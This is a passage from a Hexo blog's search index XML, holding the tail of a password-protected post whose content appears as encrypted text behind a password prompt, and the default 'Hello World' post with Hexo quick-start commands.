5d700761755f5670ee69b064d7d9c8d1b3c0e9156300cd2ad7eb14913363e226c1e721d7bd2e531d84f21c6aa51a3085a14153c0df7d30e5d7cb4a1f9024181eb93dd6aabf9158d97d5a27a4d5113cd092a3babeff28263f2158ad94f65273b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Other</category>
      
    </categories>
    
    
    <tags>
      
      <tag>other</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/11/06/hello-world/"/>
    <url>/2024/11/06/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
